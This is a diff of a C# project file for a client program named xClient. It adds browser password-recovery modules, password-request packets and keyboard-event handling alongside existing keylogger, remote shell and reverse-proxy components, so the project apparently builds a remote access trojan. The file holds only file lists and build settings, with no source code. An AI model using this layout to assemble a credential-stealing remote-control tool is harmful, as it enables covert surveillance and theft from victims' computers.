@@ -39,15 +39,20 @@
     <StartupObject>xClient.Program</StartupObject>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel.Web" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Core\Helper\FileHelper.cs" />
     <Compile Include="Core\Helper\FormatHelper.cs" />
+    <Compile Include="Core\Helper\HostHelper.cs" />
     <Compile Include="Core\Helper\NativeMethodsHelper.cs" />
     <Compile Include="Core\Helper\PlatformHelper.cs" />
     <Compile Include="Core\Helper\ScreenHelper.cs" />
@@ -71,7 +76,12 @@
     <Compile Include="Core\Encryption\AES.cs" />
     <Compile Include="Core\Encryption\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetPasswordsResponse.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
+    <Compile Include="Core\Utilities\Host.cs" />
+    <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
     <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
@@ -140,7 +150,6 @@
     <Compile Include="Core\Packets\ServerPackets\DoDownloadFileCancel.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetDrives.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetKeyloggerLogs.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoProcessKill.cs" />
@@ -153,6 +162,7 @@
     <Compile Include="Core\Packets\ServerPackets\DoVisitWebsite.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoMouseEvent.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoProcessStart.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\ProtoBuf\CallbackAttributes.cs" />
     <Compile Include="Core\ProtoBuf\Extensible.cs" />
     <Compile Include="Core\ProtoBuf\ExtensibleUtil.cs" />
@@ -161,6 +171,15 @@
     <Compile Include="Core\ProtoBuf\ProtoConverterAttribute.cs" />
     <Compile Include="Core\ProtoBuf\Serializers\ImmutableCollectionDecorator.cs" />
     <Compile Include="Core\Utilities\Shell.cs" />
+    <Compile Include="Core\Recovery\Browsers\Chrome.cs" />
+    <Compile Include="Core\Recovery\Browsers\Firefox.cs" />
+    <Compile Include="Core\Recovery\Utilities\Chromium.cs" />
+    <Compile Include="Core\Recovery\Utilities\JsonUtil.cs" />
+    <Compile Include="Core\Utilities\LoginInfo.cs" />
+    <Compile Include="Core\Recovery\Utilities\SQLiteHandler.cs" />
+    <Compile Include="Core\Recovery\Browsers\InternetExplorer.cs" />
+    <Compile Include="Core\Recovery\Browsers\Opera.cs" />
+    <Compile Include="Core\Recovery\Browsers\Yandex.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnect.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnectResponse.cs" />
     <Compile Include="Core\ReverseProxy\Packets\ReverseProxyData.cs" />
@@ -258,7 +277,6 @@
     <Compile Include="Core\Utilities\Keylogger.cs" />
     <Compile Include="Enums\MouseAction.cs" />
     <Compile Include="Enums\PathType.cs" />
-    <Compile Include="Enums\RemoteDesktopAction.cs" />
     <Compile Include="Enums\ShutdownAction.cs" />
     <Compile Include="Enums\UserStatus.cs" />
     <Compile Include="Program.cs" />
@@ -290,6 +308,7 @@
   <ItemGroup>
     <Content Include="Core\MouseKeyHook\HotKeys\ReadMe.txt" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
